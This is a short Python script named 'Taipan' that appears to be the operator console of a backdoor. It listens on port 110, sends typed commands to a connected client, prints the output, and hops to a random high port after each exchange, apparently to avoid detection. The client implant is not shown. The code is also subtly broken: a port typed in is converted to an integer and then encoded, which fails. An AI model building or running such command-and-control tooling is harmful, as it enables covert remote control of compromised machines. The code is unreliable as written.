"""
Taipan

Author - Russell Harvey
"""


import socket
import random as rand


SERVER_HOST = "0.0.0.0"
BUFFER = 1024


def main():
    port = 110
    while True:
        s = socket.socket()
        s.bind((SERVER_HOST, port))
        s.listen(5)
        print("Listening as %s:%s" % (SERVER_HOST, port))
        client_socket, client_address = s.accept()
        print("%s:%s connected." % (client_address[0], client_address[1]))
        command = input("taipan> ")
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        results = client_socket.recv(BUFFER).decode()
        print(results)
        choice_port = input("Port (Press enter for random): ")
        if choice_port == "":
            new_port = str(rand.randint(49152, 65535))
        else:
            new_port = int(choice_port)
        client_socket.send(new_port.encode())
        """
        results = client_socket.recv(BUFFER).decode()
        if results == "1":
            print("Client did not receive correct port. Please restart Taipan.")
            exit()
        """
        s.close()
        port = int(new_port)
    s.close()


main()